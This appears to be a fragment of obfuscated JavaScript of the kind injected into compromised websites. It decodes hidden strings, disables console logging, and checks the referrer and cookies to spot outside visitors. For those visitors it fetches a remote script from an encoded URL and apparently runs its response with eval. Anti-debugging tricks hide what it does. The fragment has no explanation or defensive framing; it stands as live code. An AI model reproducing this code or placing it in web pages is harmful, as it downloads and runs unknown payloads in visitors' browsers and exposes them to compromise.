e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};